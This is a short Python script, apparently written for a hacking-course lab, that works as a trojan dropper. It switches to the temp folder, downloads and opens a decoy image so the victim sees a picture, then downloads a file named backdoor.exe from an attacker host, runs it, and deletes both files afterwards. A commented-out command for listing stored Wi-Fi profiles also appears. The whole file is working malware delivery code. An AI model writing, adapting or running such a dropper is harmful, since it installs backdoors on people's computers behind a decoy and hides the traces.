#!/usr/bin/env python3

import os, re, requests, subprocess, tempfile
#import requests - enable http requests module through python
#os - library for cross-platform os command calls; otherwise you'd have to use
#subprocess.call and the specific platform commmand
#tempfile - module to access temp folder on different oses

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1] #split with / as delim -1 for last element in list
    #print(file_name)
    #print(get_response) #returns response object
    #print(get_response.content) #show content of response object
    with open(file_name, "wb") as out_file: #wb - open file for writing as binary
        out_file.write(get_response.content)

#command = "netsh wlan show profile" #-show wlan profiles stored on Winx.x computer
temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

download("http://10.0.2.13/hackfiles/porsche.png") #initial trojaned file to display
subprocess.Popen("porsche.png", shell=True) #Popen - file will run in the background and allow program to continue executing

download("http://10.0.2.13/hackfiles/backdoor.exe")
subprocess.call("backdoor.exe", shell=True) #.call - allow program to continue executing until completion

os.remove("porsche.png") #delete executed file once it finishes
os.remove("backdoor.exe")
